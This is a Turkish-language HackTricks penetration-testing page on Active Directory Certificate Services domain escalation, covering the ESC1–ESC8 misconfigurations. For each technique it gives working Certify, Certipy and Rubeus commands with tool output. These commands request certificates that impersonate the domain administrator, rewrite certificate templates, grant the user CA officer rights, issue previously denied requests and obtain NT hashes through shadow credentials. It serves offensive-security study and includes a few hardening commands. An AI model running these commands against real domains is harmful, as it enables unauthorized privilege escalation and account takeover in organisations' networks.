# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}


**Bu, aşağıdaki yazılardaki escalation technique bölümlerinin bir özetidir:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Yanlış Yapılandırılmış Certificate Templates - ESC1

### Açıklama

### Yanlış Yapılandırılmış Certificate Templates - ESC1 Açıklaması

- **Enrolment hakları, Enterprise CA tarafından düşük ayrıcalıklı kullanıcılara verilir.**
- **Manager approval gerekli değildir.**
- **Yetkili personelden herhangi bir imza gerekmez.**
- **Certificate templates üzerindeki security descriptor'lar aşırı izin vericidir ve düşük ayrıcalıklı kullanıcıların enrolment hakları almasına olanak tanır.**
- **Certificate templates, authentication'ı kolaylaştıran EKU'ları tanımlayacak şekilde yapılandırılmıştır:**
- Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) veya EKU bulunmaması (SubCA) gibi Extended Key Usage (EKU) identifier'ları dahil edilir.
- **Requester'ların Certificate Signing Request (CSR) içine bir subjectAltName ekleyebilmesine template tarafından izin verilir:**
- Active Directory (AD), mevcut olması hâlinde identity verification için certificate içindeki subjectAltName'i (SAN) önceliklendirir. Bu, bir CSR içinde SAN belirtilerek herhangi bir kullanıcının (örneğin bir domain administrator'ın) kimliğine bürünmek için certificate talep edilebileceği anlamına gelir. SAN'ın requester tarafından belirtilip belirtilemeyeceği, certificate template'in AD object'i içindeki `mspki-certificate-name-flag` property'si tarafından belirtilir. Bu property bir bitmask'tir ve `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag'inin bulunması, SAN'ın requester tarafından belirtilmesine izin verir.

> [!CAUTION]
> Açıklanan yapılandırma, düşük ayrıcalıklı kullanıcıların istedikleri herhangi bir SAN ile certificate talep etmesine ve Kerberos veya SChannel üzerinden herhangi bir domain principal olarak authentication gerçekleştirmesine olanak tanır.

Bu feature bazen ürünler veya deployment services tarafından HTTPS ya da host certificate'larının anlık olarak oluşturulmasını desteklemek veya bilgi eksikliği nedeniyle etkinleştirilir.

Bu seçenekle bir certificate oluşturulmasının bir warning tetiklediği belirtilmelidir. Ancak mevcut bir certificate template (örneğin `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` etkin olan `WebServer` template'i) duplicate edilip authentication OID'i içerecek şekilde değiştirildiğinde bu durum gerçekleşmez.<sup>[[6]](#references)</sup>

### Kötüye Kullanım

**Vulnerable certificate templates bulmak** için şunu çalıştırabilirsiniz:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
**bir yöneticiyi taklit etmek için bu zafiyet kötüye kullanılabilir:**
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Ardından oluşturulan **sertifikayı `.pfx`** formatına dönüştürebilir ve bunu tekrar **Rubeus veya certipy kullanarak kimlik doğrulaması yapmak** için kullanabilirsiniz:<sup>[[5]](#references)</sup>
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows ikili dosyaları olan "Certreq.exe" ve "Certutil.exe", PFX oluşturmak için kullanılabilir: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

AD Forest'ün yapılandırma şeması içindeki sertifika template'lerinin; özellikle onay veya imza gerektirmeyen, Client Authentication ya da Smart Card Logon EKU'suna sahip ve `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag'i etkin olanların enumeration işlemi, aşağıdaki LDAP query çalıştırılarak gerçekleştirilebilir:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Yanlış Yapılandırılmış Certificate Templates - ESC2

### Açıklama

İkinci abuse senaryosu, ilkinin bir varyasyonudur:

1. Enrollment hakları, Enterprise CA tarafından düşük ayrıcalıklı kullanıcılara verilir.
2. Manager approval gereksinimi devre dışı bırakılır.
3. Authorized signatures gereksinimi kaldırılır.
4. Certificate template üzerindeki aşırı izinli bir security descriptor, düşük ayrıcalıklı kullanıcılara certificate enrollment hakları verir.
5. **Certificate template, Any Purpose EKU veya EKU içermeyecek şekilde tanımlanmıştır.**

**Any Purpose EKU**, bir saldırganın client authentication, server authentication, code signing vb. **herhangi bir amaç** için sertifika almasına izin verir. **ESC3 için kullanılan tekniğin aynısı**, bu senaryoyu exploit etmek için kullanılabilir.

**EKU içermeyen** ve subordinate CA sertifikaları olarak işlev gören sertifikalar, **herhangi bir amaç** için exploit edilebilir ve **yeni sertifikaları imzalamak için de kullanılabilir**. Bu nedenle saldırgan, subordinate CA sertifikasını kullanarak yeni sertifikalarda keyfi EKU'lar veya alanlar belirtebilir.

Ancak **domain authentication** için oluşturulan yeni sertifikalar, varsayılan ayar olan subordinate CA'nın **`NTAuthCertificates`** object'i tarafından trusted olmadığı durumda çalışmaz. Bununla birlikte saldırgan, herhangi bir EKU'ya ve keyfi sertifika değerlerine sahip **yeni sertifikalar** oluşturabilir. Bunlar çok çeşitli amaçlar (ör. code signing, server authentication vb.) için potansiyel olarak **abuse** edilebilir ve ağdaki SAML, AD FS veya IPSec gibi diğer uygulamalar açısından önemli sonuçlar doğurabilir.<sup>[[6]](#references)</sup>

AD Forest'ın configuration schema'sı içinde bu senaryoyla eşleşen template'leri enumerate etmek için aşağıdaki LDAP query çalıştırılabilir:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Yanlış Yapılandırılmış Enrollment Agent Template'leri - ESC3

### Açıklama

Bu senaryo birinci ve ikinci senaryoya benzer, ancak **farklı bir EKU'nun** (Certificate Request Agent) ve **2 farklı template'in** kötüye kullanılmasını içerir (bu nedenle 2 ayrı gereksinim kümesi vardır).

Microsoft dokümantasyonunda **Enrollment Agent** olarak bilinen **Certificate Request Agent EKU'su** (OID 1.3.6.1.4.1.311.20.2.1), bir principal'ın **başka bir kullanıcı adına** **certificate** için **enroll** olmasına olanak tanır.

**“Enrollment agent”**, böyle bir **template'e** **enroll** olur ve elde edilen **certificate'i, diğer kullanıcı adına bir CSR'ı ortak imzalamak için kullanır**. Ardından **ortak imzalanmış CSR'ı**, **“enroll on behalf of”** işlemine izin veren bir **template'e** enroll olmak üzere CA'ya **gönderir** ve CA, **“diğer” kullanıcıya ait bir certificate** ile yanıt verir.<sup>[[6]](#references)</sup>

**Gereksinimler 1:**

- Enterprise CA tarafından düşük ayrıcalıklı kullanıcılara enrollment hakları verilir.
- Manager approval gereksinimi belirtilmemiştir.
- Authorized signature gereksinimi yoktur.
- Certificate template'in security descriptor'ı aşırı derecede izin vericidir ve düşük ayrıcalıklı kullanıcılara enrollment hakları verir.
- Certificate template, Certificate Request Agent EKU'sunu içerir ve diğer principal'lar adına başka certificate template'leri için request yapılmasını sağlar.

**Gereksinimler 2:**

- Enterprise CA, düşük ayrıcalıklı kullanıcılara enrollment hakları verir.
- Manager approval bypass edilir.
- Template'in schema version'ı 1'dir veya 2'den büyüktür ve Certificate Request Agent EKU'sunu gerektiren bir Application Policy Issuance Requirement belirtir.
- Certificate template'te tanımlanan bir EKU, domain authentication'a izin verir.
- Enrollment agent'lar için kısıtlamalar CA üzerinde uygulanmaz.

### Kötüye Kullanım

Bu senaryoyu kötüye kullanmak için [**Certify**](https://github.com/GhostPack/Certify) veya [**Certipy**](https://github.com/ly4k/Certipy) kullanabilirsiniz:<sup>[[4]](#references)</sup>
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**enrollment agent certificate** edinmesine izin verilen **users**, enrollment **agents**'ın enrollment gerçekleştirmesine izin verilen template'ler ve enrollment agent'ın adına işlem yapabileceği **accounts**, enterprise CA'ler tarafından kısıtlanabilir. Bu işlem, `certsrc.msc` **snap-in**'ini açıp **CA'ye sağ tıklayarak**, **Properties**'e tıklayıp “Enrollment Agents” sekmesine gidilerek gerçekleştirilir.

Ancak CA'ler için **default** ayarın “**Do not restrict enrollment agents**” olduğu belirtilmektedir. Yöneticiler enrollment agents kısıtlamasını etkinleştirip “Restrict enrollment agents” olarak ayarladığında bile, **default** configuration son derece permissive olmaya devam eder. Bu yapılandırma, **Everyone**'ın tüm template'lerde herhangi biri olarak enrollment gerçekleştirmesine izin verir.

## Vulnerable Certificate Template Access Control - ESC4

### **Açıklama**

**certificate templates** üzerindeki **security descriptor**, belirli **AD principals**'ın template ile ilgili sahip olduğu **permissions**'ı tanımlar.

Bir **attacker**, bir **template**'i **değiştirmek** ve **önceki bölümlerde** açıklanan **exploitable misconfigurations**'lardan herhangi birini **uygulamak** için gerekli **permissions**'a sahipse privilege escalation gerçekleştirilebilir.

Certificate template'ler için geçerli önemli permissions şunlardır:<sup>[[6]](#references)</sup>

- **Owner:** Nesne üzerinde örtük kontrol sağlar ve tüm attribute'ların değiştirilmesine izin verir.
- **FullControl:** Herhangi bir attribute'u değiştirme yeteneği de dahil olmak üzere nesne üzerinde tam yetki sağlar.
- **WriteOwner:** Nesnenin owner'ının attacker'ın kontrolündeki bir principal ile değiştirilmesine izin verir.
- **WriteDacl:** Access control'lerin değiştirilmesine ve potansiyel olarak attacker'a FullControl verilmesine olanak tanır.
- **WriteProperty:** Herhangi bir nesne property'sinin düzenlenmesine izin verir.

### İstismar

Template'ler ve diğer PKI nesneleri üzerinde düzenleme haklarına sahip principal'ları belirlemek için Certify ile enumerate edin:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
An önceki örnektekine benzer bir privesc:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4, bir kullanıcının bir certificate template üzerinde yazma ayrıcalıklarına sahip olmasıdır. Bu, örneğin certificate template yapılandırmasının üzerine yazılarak template'in ESC1'e karşı savunmasız hâle getirilmesi için kötüye kullanılabilir.

Yukarıdaki path'te görebileceğimiz gibi bu ayrıcalıklara yalnızca `JOHNPC` sahip, ancak kullanıcımız `JOHN`, `JOHNPC`'ye giden yeni `AddKeyCredentialLink` edge'ine sahip. Bu teknik certificates ile ilişkili olduğundan, bu saldırıyı da [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) olarak bilinen şekilde uyguladım.<sup>[[8]](#references)</sup> Burada, kurbanın NT hash'ini almak için Certipy'nin `shadow auto` command'ının kısa bir ön izlemesini görebilirsiniz.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy**, tek bir komutla bir certificate template'ın yapılandırmasının üzerine yazabilir. **Varsayılan olarak**, Certipy yapılandırmanın üzerine yazarak onu **ESC1'e karşı savunmasız** hâle getirir. Ayrıca eski yapılandırmayı kaydetmek için **`-save-old` parametresini belirtebiliriz**; bu, saldırımızdan sonra yapılandırmayı **geri yüklemek** için faydalı olacaktır.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Güvenlik Açığı Bulunan PKI Nesnesi Erişim Denetimi - ESC5

### Açıklama

Certificate Templates ve certificate authority dışındaki çeşitli nesneleri de içeren kapsamlı, birbirine bağlı ACL tabanlı ilişkiler ağı, tüm AD CS sisteminin güvenliğini etkileyebilir. Güvenliği önemli ölçüde etkileyebilecek bu nesneler şunlardır:

- S4U2Self veya S4U2Proxy gibi mekanizmalar aracılığıyla ele geçirilebilecek CA sunucusunun AD bilgisayar nesnesi.
- CA sunucusunun RPC/DCOM sunucusu.
- `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` belirli container path içindeki herhangi bir alt AD nesnesi veya container. Bu path; Certificate Templates container, Certification Authorities container, NTAuthCertificates nesnesi ve Enrollment Services Container gibi container ve nesneleri içerir ancak bunlarla sınırlı değildir.

Düşük ayrıcalıklı bir saldırgan bu kritik bileşenlerden herhangi biri üzerinde kontrol elde edebilirse PKI sisteminin güvenliği tehlikeye girebilir.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Açıklama

[**CQure Academy gönderisinde**](https://cqureacademy.com/blog/enhanced-key-usage) ele alınan konu, Microsoft tarafından açıklandığı üzere **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag'inin etkilerine de değinmektedir. Bir Certification Authority (CA) üzerinde etkinleştirildiğinde bu yapılandırma, Active Directory® üzerinden oluşturulanlar da dahil olmak üzere **herhangi bir request** için **subject alternative name** alanına **kullanıcı tarafından tanımlanan değerlerin** eklenmesine izin verir. Sonuç olarak bu özellik, bir **intruder**'ın domain **authentication** için yapılandırılmış **herhangi bir template** üzerinden enrollment gerçekleştirmesine olanak tanır; buna standart User template gibi **unprivileged** kullanıcıların enrollment gerçekleştirmesine açık template'ler de dahildir. Böylece bir certificate elde edilerek intruder'ın domain administrator veya domain içindeki **başka herhangi bir etkin varlık** olarak authenticate olması sağlanabilir.<sup>[[9]](#references)</sup>

**Not**: **alternative names** değerlerini bir Certificate Signing Request (CSR) içine `certreq.exe` içindeki `-attrib "SAN:"` argument'i ("Name Value Pairs" olarak adlandırılır) aracılığıyla ekleme yaklaşımı, ESC1'deki SAN exploitation stratejisinden farklıdır. Buradaki ayrım, account bilgilerinin nasıl kapsüllendiğindedir: bilgiler bir extension yerine certificate attribute içinde tutulur.

### Abuse

Ayarın etkin olup olmadığını doğrulamak için kuruluşlar `certutil.exe` ile aşağıdaki command'i kullanabilir:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Bu işlem esasen **uzak kayıt defteri erişimi** kullanır; dolayısıyla alternatif bir yaklaşım şu olabilir:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
[**Certify**](https://github.com/GhostPack/Certify) ve [**Certipy**](https://github.com/ly4k/Certipy) gibi araçlar bu yanlış yapılandırmayı tespit edip istismar edebilir:<sup>[[4]](#references)</sup>
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Bu ayarları değiştirmek için, **domain administrative** haklarına veya eşdeğerine sahip olunduğu varsayılarak, aşağıdaki komut herhangi bir workstation'dan çalıştırılabilir:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Bu yapılandırmayı ortamınızda devre dışı bırakmak için flag şu şekilde kaldırılabilir:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Mayıs 2022 güvenlik güncellemelerinden sonra, yeni verilen **sertifikalar**, **istekte bulunan kişinin `objectSid` özelliğini** içeren bir **security extension** barındıracaktır. ESC1 için bu SID, belirtilen SAN'dan türetilir. Ancak **ESC6** için SID, SAN'ı değil, **istekte bulunan kişinin `objectSid`** değerini yansıtır.\
> ESC6'yı exploit etmek için sistemin, **SAN'ı yeni security extension'ın önceliğine koyan** ESC10'a (Weak Certificate Mappings) karşı savunmasız olması gerekir.

## Vulnerable Certificate Authority Access Control - ESC7

### Saldırı 1

#### Açıklama

Bir certificate authority için erişim denetimi, CA eylemlerini yöneten bir dizi izin aracılığıyla sağlanır. Bu izinler, `certsrv.msc` açılarak, bir CA'ya sağ tıklanıp özellikler seçilerek ve ardından Security sekmesine gidilerek görüntülenebilir. Ayrıca izinler, aşağıdaki gibi komutlarla PSPKI module kullanılarak enumerate edilebilir:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Bu, sırasıyla “CA administrator” ve “Certificate Manager” rollerine karşılık gelen başlıca haklar olan **`ManageCA`** ve **`ManageCertificates`** hakkında bilgi sağlar.<sup>[[6]](#references)</sup>

#### Kötüye Kullanım

Bir sertifika yetkilisi üzerinde **`ManageCA`** haklarına sahip olmak, principal'ın PSPKI kullanarak ayarları uzaktan değiştirmesine olanak tanır. Buna, herhangi bir template'te SAN belirtimine izin vermek için **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag'ini etkinleştirmek de dahildir; bu, domain escalation açısından kritik bir unsurdur.

Bu sürecin basitleştirilmesi, doğrudan GUI etkileşimi olmadan değişiklik yapılmasına olanak tanıyan PSPKI’nin **Enable-PolicyModuleFlag** cmdlet’i kullanılarak gerçekleştirilebilir.

**`ManageCertificates`** haklarına sahip olmak, bekleyen isteklerin onaylanmasını sağlar ve böylece "CA certificate manager approval" güvenlik önlemini etkili bir şekilde aşar.

Bir certificate istemek, onaylamak ve indirmek için **Certify** ve **PSPKI** modüllerinin bir kombinasyonu kullanılabilir:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Saldırı 2

#### Açıklama

> [!WARNING]
> **önceki saldırıda**, **ESC6 saldırısını** gerçekleştirmek için **EDITF_ATTRIBUTESUBJECTALTNAME2** bayrağını **etkinleştirmek** amacıyla **`Manage CA`** izinleri kullanıldı, ancak CA hizmeti (`CertSvc`) yeniden başlatılana kadar bunun hiçbir etkisi olmayacaktır. Bir kullanıcı **`Manage CA`** erişim hakkına sahip olduğunda, hizmeti **yeniden başlatmasına** da izin verilir. Ancak bu, kullanıcının hizmeti **uzaktan yeniden başlatabileceği** anlamına gelmez. Ayrıca, Mayıs 2022 güvenlik güncellemeleri nedeniyle çoğu güncellenmiş ortamda E**SC6 varsayılan olarak çalışmayabilir**.

Bu nedenle burada başka bir saldırı sunulmaktadır.

Ön koşullar:

- Yalnızca **`ManageCA` izni**
- **`Manage Certificates`** izni (**`ManageCA`** üzerinden verilebilir)
- **`SubCA`** sertifika şablonu **etkinleştirilmiş** olmalıdır (**`ManageCA`** üzerinden etkinleştirilebilir)

Teknik, **`Manage CA`** ve **`Manage Certificates`** erişim hakkına sahip kullanıcıların **başarısız sertifika istekleri düzenleyebilmesi** gerçeğine dayanır. **`SubCA`** sertifika şablonu **ESC1**'e karşı savunmasızdır, ancak şablona yalnızca **yöneticiler** kayıt olabilir. Bu nedenle bir **kullanıcı**, **`SubCA`** şablonuna kayıt olmak için **istekte bulunabilir** - bu istek **reddedilir** - ancak daha sonra yönetici tarafından düzenlenir.<sup>[[6]](#references)</sup>

#### Kötüye Kullanım

Kullanıcınızı yeni bir yetkili olarak ekleyerek **`Manage Certificates`** erişim hakkını kendinize **verebilirsiniz**.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** template, `-enable-template` parametresiyle **CA üzerinde etkinleştirilebilir**. Varsayılan olarak `SubCA` template'i etkindir.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Bu saldırı için ön koşulları yerine getirdiysek, **`SubCA` template'ini temel alan bir sertifika talep ederek** başlayabiliriz.

**Bu istek reddedilecektir**, ancak private key'i kaydedecek ve request ID'yi not edeceğiz.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
**`Manage CA` ve `Manage Certificates`** ile, ardından `ca` komutu ve `-issue-request <request ID>` parametresini kullanarak **başarısız sertifika isteğini** verebiliriz.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Ve son olarak, `req` komutu ve `-retrieve <request ID>` parametresiyle **düzenlenmiş sertifikayı alabiliriz**.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Saldırı 3 – Manage Certificates Extension Abuse (SetExtension)

#### Açıklama

Klasik ESC7 abuse yöntemlerine (EDITF özniteliklerini etkinleştirme veya bekleyen istekleri onaylama) ek olarak, **Certify 2.0** yalnızca Enterprise CA üzerinde *Manage Certificates* (diğer adıyla **Certificate Manager / Officer**) rolünü gerektiren yepyeni bir primitive ortaya çıkardı.<sup>[[3]](#references)</sup>

`ICertAdmin::SetExtension` RPC yöntemi, *Manage Certificates* yetkisine sahip herhangi bir principal tarafından çalıştırılabilir. Bu yöntem geleneksel olarak meşru CA'ler tarafından **bekleyen** isteklerdeki extension'ları güncellemek için kullanılırken saldırganlar, onay bekleyen bir isteğe **varsayılan olmayan bir certificate extension** (örneğin `1.1.1.1` gibi özel bir *Certificate Issuance Policy* OID'si) eklemek için bunu abuse edebilir.

Hedeflenen template bu extension için **varsayılan bir değer tanımlamadığından**, istek sonunda verildiğinde CA saldırganın kontrolündeki değerin üzerine yazmaz. Bu nedenle ortaya çıkan sertifika, saldırganın seçtiği bir extension'ı içerir ve bu extension:

* Diğer vulnerable template'ların Application / Issuance Policy gereksinimlerini karşılayabilir (privilege escalation ile sonuçlanabilir).
* Sertifikanın üçüncü taraf sistemlerde beklenmedik bir güvene sahip olmasını sağlayan ek EKU'lar veya policy'ler enjekte edebilir.

Kısacası, ESC7'nin daha önce “daha az güçlü” kısmı olarak kabul edilen *Manage Certificates*, artık CA yapılandırmasına dokunmadan veya daha kısıtlayıcı *Manage CA* hakkını gerektirmeden full privilege escalation ya da uzun vadeli persistence için kullanılabilir.

#### Certify 2.0 ile primitive'i abuse etme

1. **Beklemede kalacak bir certificate request gönderin.** Bu, manager approval gerektiren bir template ile zorlanabilir:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. Yeni `manage-ca` command'ini kullanarak bekleyen isteğe **özel bir extension ekleyin**:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Template zaten *Certificate Issuance Policies* extension'ını tanımlamıyorsa yukarıdaki değer issuance sonrasında korunur.*

3. **İsteği verin** (rolünüzde *Manage Certificates* approval hakları da varsa) veya bir operatörün isteği onaylamasını bekleyin. Verildikten sonra sertifikayı indirin:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Ortaya çıkan sertifika artık kötü amaçlı issuance-policy OID'sini içerir ve sonraki saldırılarda (ör. ESC13, domain escalation vb.) kullanılabilir.

> NOT: Aynı saldırı, `ca` command'i ve `-set-extension` parametresi üzerinden Certipy ≥ 4.7 ile de gerçekleştirilebilir.

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Açıklama

> [!TIP]
> **AD CS'nin kurulu olduğu** ortamlarda, **vulnerable bir web enrollment endpoint'i** mevcutsa ve en az bir **certificate template, domain computer enrollment ve client authentication'a izin verecek şekilde publish edilmişse** (varsayılan **`Machine`** template'i gibi), spooler service'i etkin olan **herhangi bir computer'ın saldırgan tarafından compromise edilmesi mümkün hale gelir**!

AD CS tarafından çeşitli **HTTP tabanlı enrollment yöntemleri** desteklenir ve bunlar yöneticilerin kurabileceği ek server role'leri aracılığıyla kullanıma sunulur. HTTP tabanlı certificate enrollment için bu interface'ler **NTLM relay attack'lerine** açıktır. Saldırgan, **compromise edilmiş bir machine üzerinden inbound NTLM ile authentication gerçekleştiren herhangi bir AD account'unu impersonate edebilir**. Saldırgan, victim account'unu impersonate ederken bu web interface'lerine erişerek `User` veya `Machine` certificate template'lerini kullanıp **client authentication certificate** isteyebilir.

- **Web enrollment interface** (`http://<caserver>/certsrv/` adresinde bulunan eski bir ASP application), varsayılan olarak yalnızca HTTP kullanır ve bu da NTLM relay attack'lerine karşı koruma sağlamaz. Ayrıca Authorization HTTP header üzerinden açıkça yalnızca NTLM authentication'a izin verir; bu nedenle Kerberos gibi daha güvenli authentication yöntemleri kullanılamaz.
- **Certificate Enrollment Service (CES)**, **Certificate Enrollment Policy (CEP) Web Service** ve **Network Device Enrollment Service (NDES)**, varsayılan olarak Authorization HTTP header üzerinden negotiate authentication'ı destekler. Negotiate authentication hem **Kerberos** hem de **NTLM** desteğine sahiptir ve saldırganın relay attack'leri sırasında authentication'ı **NTLM'e downgrade etmesine** olanak tanır. Bu web service'leri varsayılan olarak HTTPS'i etkinleştirse de HTTPS tek başına **NTLM relay attack'lerine karşı koruma sağlamaz**. HTTPS service'lerinde NTLM relay attack'lerine karşı koruma yalnızca HTTPS channel binding ile birlikte kullanıldığında mümkündür. Ne yazık ki AD CS, channel binding için gereken IIS üzerindeki Extended Protection for Authentication'ı etkinleştirmez.<sup>[[6]](#references)</sup>

NTLM relay attack'lerindeki yaygın bir **sorun**, **NTLM session'larının kısa süreli olması** ve saldırganın **NTLM signing gerektiren service'lerle** etkileşim kuramamasıdır.

Bununla birlikte bu sınırlama, user için bir certificate elde etmek amacıyla NTLM relay attack'inden yararlanılarak aşılabilir; çünkü session'ın süresini certificate'ın geçerlilik süresi belirler ve certificate, **NTLM signing zorunlu olan service'lerle** kullanılabilir. Çalınmış bir certificate'ın nasıl kullanılacağına ilişkin talimatlar için bkz.:


{{#ref}}
account-persistence.md
{{#endref}}

NTLM relay attack'lerinin bir diğer sınırlaması, **victim account tarafından attacker-controlled bir machine'e authentication gerçekleştirilmesi gerekmesidir**. Saldırgan ya bekleyebilir ya da bu authentication'ı **force etmeye** çalışabilir:


{{#ref}}
